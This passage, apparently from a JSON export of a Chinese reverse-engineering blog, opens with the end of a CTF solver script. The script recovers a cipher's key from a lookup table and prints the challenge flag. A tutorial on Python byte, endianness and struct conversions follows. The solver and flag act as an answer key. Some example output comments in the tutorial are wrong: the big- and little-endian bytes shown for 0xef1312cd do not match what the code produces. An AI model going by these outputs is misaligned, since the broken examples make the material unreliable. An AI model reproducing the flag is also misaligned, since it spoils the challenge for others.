0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000013, 0x00000016, 0x00000058, 0x0000005D, 0x00000078, 0x000000AE, 0x000000BB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000005B, 0x00000089, 0x0000009D, 0x000000B7, 0x000000C5, 0x000000C6, 0x000000F9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x00000016, 0x00000020, 0x00000047, 0x0000008F, 0x00000098, 0x000000CC, 0x000000DF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x00000070, 0x000000A8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000062, 0x00000068, 0x000000C2, 0x000000EA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000A, 0x0000000D, 0x0000002F, 0x00000044, 0x00000057, 0x0000007F, 0x000000DB, 0x000000E3, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000B, 0x00000018, 0x00000059, 0x00000086, 0x000000DD, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001C, 0x00000031, 0x0000003D, 0x00000040, 0x00000097, 0x0000009D, 0x0000009E, 0x000000A1, 0x000000C7, 0x000000CD, 0x000000E2, 0x000000F8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000A, 0x00000020, 0x00000025, 0x00000035, 0x00000044, 0x00000055, 0x00000072, 0x000000CB, 0x000000DA, 0x000000DD, 0x000000ED, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000044, 0x00000052, 0x00000085, 0x00000093, 0x000000B4, 0x000000CB, 0x000000E3, 0x000000F0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000052, 0x00000059, 0x000000A2, 0x000000BE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000002D, 0x00000055, 0x0000005B, 0x00000084, 0x000000C4, 0x000000D6, 0x000000E1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000013, 0x00000037, 0x00000041, 0x00000051, 0x00000053, 0x00000075, 0x00000076, 0x000000EA, 0x000000EF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000F, 0x00000040, 0x0000006B, 0x0000009C, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000005, 0x00000011, 0x00000014, 0x00000017, 0x00000021, 0x00000058, 0x00000061, 0x0000006A, 0x00000083, 0x000000D6, 0x000000E1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000022, 0x00000026, 0x00000090, 0x000000EC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000006B, 0x0000006C, 0x00000086, 0x0000008C, 0x00000093, 0x000000F7, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000010, 0x00000013, 0x0000007C, 0x000000C0, 0x000000CB, 0x000000F3, 0x000000F6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000027, 0x0000007C, 0x0000007F, 0x00000083, 0x00000086, 0x000000D9, 0x000000DB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000030, 0x00000032, 0x0000006D, 0x00000081, 0x000000BF, 0x000000ED, 0x000000FA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x00000022, 0x00000030, 0x00000032, 0x00000036, 0x0000005C, 0x000000D3, 0x000000EC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x00000004, 0x00000009, 0x00000014, 0x00000080, 0x0000008E, 0x00000098, 0x000000FC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001F, 0x00000064, 0x000000B6, 0x000000C4, 0x000000DD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000042, 0x00000056, 0x0000008E, 0x000000AF, 0x000000DD, 0x000000EF, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000032, 0x00000045, 0x0000004E, 0x0000006D, 0x00000075, 0x0000008F, 0x000000C8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000018, 0x0000005A, 0x0000005F, 0x0000006B, 0x00000096, 0x000000DB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000C, 0x0000006A, 0x000000CF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x0000003F, 0x00000065, 0x000000C2, 0x000000EF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000004F, 0x00000050, 0x00000063, 0x000000C3, 0x000000CB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000000, 0x0000009B, 0x000000BC, 0x000000EE, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000004, 0x00000023, 0x0000003E, 0x00000042, 0x00000078, 0x000000D4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x00000033, 0x00000036, 0x00000046, 0x0000007A, 0x00000083, 0x000000B2, 0x000000BE, 0x000000FC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000006E, 0x000000A5, 0x000000A6, 0x000000A7, 0x000000A9, 0x000000B7, 0x000000D2, 0x000000E5, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x00000017, 0x0000004F, 0x00000050, 0x00000062, 0x0000007E, 0x00000091, 0x00000097, 0x000000B1, 0x000000E4, 0x000000E9, 0x000000EC, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000051, 0x00000057, 0x0000005E, 0x000000B3, 0x000000DC, 0x000000F1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x0000000C, 0x0000004B, 0x0000005A, 0x0000008D, 0x00000095, 0x000000B8, 0x000000DB, 0x000000EF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000019, 0x0000008B, 0x000000D8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001A, 0x0000006A, 0x0000007B, 0x000000B0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000005E, 0x0000006B, 0x000000AB, 0x000000AF, 0x000000F5, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001B, 0x00000058, 0x0000008C, 0x00000096, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000050, 0x000000B5, 0x000000E5, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000001, 0x00000007, 0x00000052, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001D, 0x0000006D, 0x0000006F, 0x0000007C, 0x0000009F, 0x000000B7, 0x000000BE, 0x000000D4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000027, 0x0000002B, 0x00000075, 0x00000089, 0x000000A3, 0x000000D0, 0x000000D4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000002E, 0x000000CD, 0x000000F4, 0x000000FE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000C, 0x00000012, 0x00000042, 0x00000070, 0x00000075, 0x00000079, 0x00000097, 0x00000099, 0x000000BF, 0x000000CE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x0000007D, 0x00000088, 0x000000A3, 0x000000B8, 0x000000C9, 0x000000F1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001A, 0x0000001E, 0x00000052, 0x00000086, 0x000000AE, 0x000000D7, 0x000000E9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000D, 0x000000AD, 0x000000AF, 0x000000C0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0x0000004D, 0x0000006C, 0x00000074, 0x00000076, 0x0000007A, 0x000000A9, 0x000000AE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000000, 0x0000000C, 0x00000017, 0x0000001E, 0x00000024, 0x00000027, 0x00000064, 0x00000067, 0x000000CC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x0000003D, 0x00000084, 0x00000085, 0x000000CD, 0x000000EB, 0x000000F8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000057, 0x00000084, 0x0000008A, 0x000000B6, 0x000000CD, 0x000000E9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x00000021, 0x0000002E, 0x0000003B, 0x00000073, 0x00000074, 0x000000A0, 0x000000E1, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000021, 0x00000033, 0x00000037, 0x00000067, 0x00000072, 0x000000A1, 0x000000CA, 0x000000E1, 0x000000FB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000023, 0x00000038, 0x00000047, 0x00000048, 0x0000004B, 0x0000004C, 0x00000057, 0x00000059, 0x00000069, 0x00000090, 0x000000A0, 0x000000BA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000031, 0x00000035, 0x0000003C, 0x00000093, 0x000000A1, 0x000000DE, 0x000000EE, 0x000000FD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000003, 0x00000066, 0x0000008C, 0x00000091, 0x00000094, 0x000000A0, 0x000000B0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000040, 0x0000007A, 0x00000096, 0x000000A4, 0x000000E0, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000030, 0x0000003D, 0x0000005A, 0x0000006C, 0x00000080, 0x000000E6, 0x000000ED, 0x000000F2, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000004, 0x00000019, 0x00000082, 0x00000088, 0x00000090, 0x00000094, 0x000000AC, 0x000000F9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000022, 0x00000028, 0x0000003C, 0x0000006E, 0x00000079, 0x0000007E, 0x0000008E, 0x00000091, 0x00000099, 0x0000009D, 0x000000A0, 0x000000CC, 0x000000EC, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0x00000033, 0x00000082, 0x0000008C, 0x00000090, 0x000000AA, 0x000000BC, 0x000000F8, 0x000000FE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000017, 0x00000049, 0x00000093, 0x000000C7, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000019, 0x00000047, 0x0000005B, 0x00000060, 0x00000065, 0x000000BD, 0x000000F2, 0x000000F5, 0x000000F6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000020, 0x0000002B, 0x00000031, 0x00000047, 0x00000048, 0x00000051, 0x00000054, 0x00000064, 0x00000078, 0x000000A1, 0x000000A5, 0x000000B4, 0x000000C8, 0x000000EE, 0x000000FE, 0x00000005, 0x00000011, 0x0000004A, 0x0000005D, 0x00000076, 0x00000077, 0x000000FE, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0x0000006D, 0x0000009A, 0x000000A3, 0x000000CE, 0x000000DC, 0x000000E0, 0x000000E4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000013, 0x0000001D, 0x0000003A, 0x00000046, 0x00000098, 0x0000009C, 0x000000E7, 0x000000F3, 0x000000F5, 0x000000F8, 0x000000FC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001E, 0x00000034, 0x0000003B, 0x00000046, 0x00000079, 0x000000A7, 0x000000B0, 0x000000C4, 0x000000E0, 0x000000E7, 0x000000F6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000070, 0x00000087, 0x00000097, 0x0000009E, 0x000000A6, 0x000000FB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000001C, 0x00000021, 0x0000002B, 0x00000039, 0x0000004A, 0x0000006C, 0x00000081, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000006, 0x00000041, 0x00000064, 0x0000007F, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000020, 0x00000022, 0x0000005C, 0x000000B0, 0x000000B6, 0x000000B9, 0x000000C2, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000014, 0x0000001E, 0x00000079, 0x00000092, 0x00000096, 0x000000BC, 0x000000C7, 0x000000DA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000016, 0x00000046, 0x0000007D, 0x00000089, 0x000000D5, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000043, 0x0000004C, 0x0000006A, 0x0000007D, 0x0000007F, 0x0000008D, 0x000000C2, 0x000000F2, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000029, 0x00000045, 0x00000051, 0x00000069, 0x00000091, 0x000000B6, 0x000000EA, 0x000000F5, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000011, 0x00000036, 0x00000038, 0x00000040, 0x0000005C, 0x00000099, 0x000000D1, 0x000000E9, 0x000000EE, 0x000000F9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000004B, 0x00000058, 0x00000071, 0x00000084, 0x000000C6, 0x000000F3, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF]arr = np.array(_arr).reshape((4, 21, 15))S = list(range(256))with open('./cipher-release', 'rb') as f: src = f.read() src = list(src)with open('output', 'rb') as f: final = f.read() final = list(final)key = [[-1 for order in range(21)] for round in range(4)]for i in range(256): S[i] = final[src.index(i)] if len(np.argwhere(arr == i)) == 1: round, order_i, j = list(np.argwhere(arr == i)[0]) key[round][S[i] - i] = order_i # print(f\"round=&#123;round&#125;,order[&#123;S[i]-i&#125;]=&#123;order_i&#125;\")flag = b''for round in range(4): order = key[round] seed = 0 pre_order = list(range(21)) for i in range(21): j = pre_order.index(order[i]) pre_order[i], pre_order[j] = pre_order[j], pre_order[i] seed += math.factorial(20 - i) * (j - i) flag += seed.to_bytes(8, 'big')print(flag)# *ctf&#123;b0rIn9_67hdnm_cIph3ri_7292&#125;","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://oacia.dev/tags/ctf/"},{"name":"go","slug":"go","permalink":"https://oacia.dev/tags/go/"},{"name":"powershell混淆","slug":"powershell混淆","permalink":"https://oacia.dev/tags/powershell%E6%B7%B7%E6%B7%86/"},{"name":"rust","slug":"rust","permalink":"https://oacia.dev/tags/rust/"}]},{"title":"在python中随心所欲的操作变量","slug":"在python中随心所欲的操作变量","date":"2023-07-23T11:50:09.000Z","updated":"2025-04-08T18:55:12.177Z","comments":true,"path":"在python中随心所欲的操作变量/","link":"","permalink":"https://oacia.dev/%E5%9C%A8python%E4%B8%AD%E9%9A%8F%E5%BF%83%E6%89%80%E6%AC%B2%E7%9A%84%E6%93%8D%E4%BD%9C%E5%8F%98%E9%87%8F/","excerpt":"","text":"在日常的逆向过程中，我常常会因为各种数值形式上的转换而相当纠结，比如大端，小端，字节转字符串等等，而且也十分的浪费时间去纠结这些细枝末节上的事情，尤其是每次还得 google 去搜索相关的代码，所以我心想与其碎片化的从浏览器中得到自己想要的答案，不如将这些代码整理到这一篇博客内，供我未来遇到这方面的困扰时，可以直接在这里找到答案. # 数据基本类型 一个字节 = 8 位 qword 数据类型仅在 64 位程序中存在 类型 字节数 位数 ida 中的表示形式 举例 byte 1 8 db 0x12 word 2 16 dw 0x1234 dword 4 32 dd 0x12345678 qword 8 64 dq 0x1234567812345678 # 数据的存储形式 假设有如下 c 代码: int a = 0x12345678 # 大端存储 (Big-Endian) 数据的高字节存储在低地址中，数据的低字节存储在高地址中，顺序存储 栈内的数据的表示形式: 地址 数值 0x400001 12h 0x400002 34h 0x400003 56h 0x400004 78h # 小端存储 (Little-Endian) 数据的高字节存储在高地址中，数据的低字节存储在低地址中，逆序存储 栈内的数据的表示形式: 地址 数值 0x400001 78h 0x400002 56h 0x400003 34h 0x400004 12h # 在 IDA 中取出数据的某一位 假设有如下数据 a1=0x12345678 , 在 IDA 中可能会出现 HIBYTE , BYTE2 , BYTE1 , LOBYTE 来取出一个数据某一位的值，其含义如下 符号 取出的值 HIBYTE(a1) 0x12 BYTE2(a1) 0x34 BYTE1(a1) 0x56 LOBYTE(a1) 0x78 # 数字 &amp;&amp; 字节 # 数字 =&gt; 字节 # to_bytes(length: int,byteorder: str,*,signed: bool = ...) -> bytes# 默认 signed=False, 即无符号数表示num = 0xef1312cdbytes_big = num.to_bytes(4, 'big') # 大端模式，顺序存储print(bytes_big) # b'\\x12\\xcd\\x13\\xef'bytes_little = num.to_bytes(4, 'little') # 小端模式，逆序存储print(bytes_little) # b'\\xef\\x13\\xcd\\x12'# 字节 =&gt; 数字 # from_bytes(bytes: Iterable[int] | SupportsBytes,byteorder: str,*,signed: bool = ...) -> int# 默认 signed=False, 即无符号数表示bytes = b'\\xef\\x13\\x12\\xcd'num_big = int.from_bytes(bytes, 'big') # 大端模式，顺序存储print(hex(num_big)) # 0xef1312cdnum_little = int.from_bytes(bytes, 'little') # 小端模式，逆序存储print(hex(num_little)) # 0xcd1213ef# 字符串 &amp;&amp; 字节 # 字符串 =&gt; 字节 str = \"oacia\"byte = str.encode()print(byte)# b'oacia'# 字节 =&gt; 字符串 byte = b'oacia'str = byte.decode()print(str)# oacia# 十六进制字符串 &amp;&amp; 字节 # 十六进制字符串 =&gt; 字节 import binascii# a2b_hex(__hexstr: str | bytes) -> byteshex_str = \"6f61636961\"hex_bytes = binascii.a2b_hex(hex_str)print(hex_bytes) # b'oacia'# 字节 =&gt; 十六进制字符串 import binascii# b2a_hex(__data: bytes) -> byteshex_bytes = b'oacia'hex_str = binascii.b2a_hex(hex_bytes)print(hex_str) # b'6f61636961'# 列表 &amp;&amp; 字符串 # 列表 =&gt; 字符串 my_list = [0x6f, 0x61, 0x63, 0x69, 0x61]str = \"\".join(list(map(chr, my_list)))print(str)# oacia# 字符串 =&gt; 列表 str = \"oacia\"my_list = list(map(ord, str))print(my_list) # [111, 97, 99, 105, 97]# struct 处理字节流 当我们从 dump 一块内存后，肯定是想要再 python 读取字节流并转换成指定数值大小的数组 (如 Int 数组) 的形式，这就需要用到 struct 来处理 dump 下来的字节流 struct 模块中最重要的三个函数是 struct.pack() , struct.unpack() , struct.calcsize() struct.pack(format, v1, v2, ...) 按照给定的格式 (format)，把数据封装成字节流 (实际上是类似于 c 结构体的字节流) struct.unpack(format, byte) 按照给定的格式 (fmt) 解析字节流 byte，返回解析出来的 tuple struct.calcsize(format) 计算给定的格式 (format) 占用多少字节的内存 # format 支持的格式 FORMAT C TYPE PYTHON TYPE STANDARD SIZE x pad byte no value c char string of length 1 1 b signed char integer 1 B unsigned char integer 1 ? _Bool bool 1 h short integer 2 H unsigned short integer 2 i int integer 4 I unsigned int integer 4 l long integer 4 L unsigned long integer 4 q long long integer 8 Q unsigned long long integer 8 f float float 4 d double float 8 s char[] string p char[] string P void * integer 4 一些需要注意的点 q 和 Q 只在机器支持 64 位操作时有意思 每个格式前可以有一个数字，表示个数 s 格式表示一定长度的字符串，4s 表示长度为 4 的字符串，但是 p 表示的是 pascal 字符串 P 用来转换一个指针，其长度和机器字长相关 最后一个可以用来表示指针类型的，占 4 个字节 # 字节对齐方式 我们可以通过添加前缀来指定字节流按照何种方式对齐 CHARACTER 